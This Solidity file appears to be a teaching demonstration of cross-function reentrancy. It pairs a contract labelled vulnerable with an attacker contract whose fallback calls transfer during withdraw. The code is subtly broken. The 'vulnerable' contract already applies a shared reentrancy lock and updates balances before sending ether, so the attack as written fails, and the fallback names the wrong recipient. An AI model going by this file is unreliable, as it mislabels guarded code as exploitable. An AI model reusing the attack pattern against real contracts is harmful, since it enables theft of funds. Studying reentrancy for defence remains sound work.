// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract VulnerableCrossFunction {
    mapping(address => uint256) public balances;
    bool internal locked;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 _amount) external noReentrant {
        require(balances[msg.sender] >= _amount, "Insufficient balance");
        balances[msg.sender] -= _amount;
        (bool success, ) = msg.sender.call{value: _amount}("");
        require(success, "Transfer failed");
    }

    function transfer(address _to, uint256 _amount) external noReentrant {
        require(balances[msg.sender] >= _amount, "Insufficient balance");
        balances[msg.sender] -= _amount;
        balances[_to] += _amount;
    }

    modifier noReentrant() {
        require(!locked, "No re-entrancy");
        locked = true;
        _;
        locked = false;
    }
}

contract AttackerCrossFunction {
    VulnerableCrossFunction public vulnerableContract;

    constructor(address _vulnerableContract) {
        vulnerableContract = VulnerableCrossFunction(_vulnerableContract);
    }

    fallback() external payable {
        if (address(vulnerableContract).balance >= 1 ether) {
            vulnerableContract.transfer(msg.sender, 1 ether);
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        vulnerableContract.deposit{value: 1 ether}();
        vulnerableContract.withdraw(1 ether);
    }
}
